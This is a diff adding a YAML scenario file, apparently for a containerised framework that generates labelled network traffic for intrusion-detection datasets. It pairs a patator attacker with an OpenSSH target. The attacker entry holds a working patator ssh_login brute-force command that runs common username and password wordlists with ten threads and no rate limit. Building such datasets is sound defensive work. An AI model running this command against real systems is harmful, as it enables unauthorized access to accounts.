@@ -1,0 +1,27 @@
+attacker:
+  name: patator
+  image: ghcr.io/idlab-discover/concap/patator:cic
+  atkCommand: python3 patator.py ssh_login host=$TARGET_IP user=FILE0 password=FILE1 0=/usr/share/wordlists/top-usernames-shortlist.txt 1=/usr/share/wordlists/2023-200_most_used_passwords.txt persistent=1 --rate-limit=0 --threads=10 -x ignore:mesg='Authentication failed'
+  cpuRequest: 1500m
+  memRequest: 500Mi
+target:
+  name: openssh-server
+  image: ghcr.io/idlab-discover/concap/openssh-server:cic-1.0.0
+  cpuRequest: 500m
+  memRequest: 500Mi
+network:
+  bandwidth: 100mbit
+  queueSize: 100ms
+  limit: 10000
+  delay: 0ms
+  jitter: 0ms
+  distribution: normal
+  loss: 0%
+  corrupt: 0%
+  duplicate: 0%
+  seed: 0
+labels:
+  label: 1
+  category: bruteforce-ssh
+  subcategory: patator
+  scenario: patator_ssh_cic_T10_P
